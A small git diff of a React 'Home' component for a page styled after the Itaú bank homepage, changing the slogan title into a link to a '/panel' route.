@@ -15,7 +15,7 @@ const Home = () => {
                 <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
             </div>
             <div className='title'>
-                <span>Um Itaú de vantagens,<br />mais simples e seguro<br />pra você</span>
+                <Link className='linker' to="/panel"><span>Um Itaú de vantagens,<br />mais simples e seguro<br />pra você</span></Link>
             </div>
             <div className='actions'>
                 <Link to="/contapf"><button>conta pessoa física</button></Link>
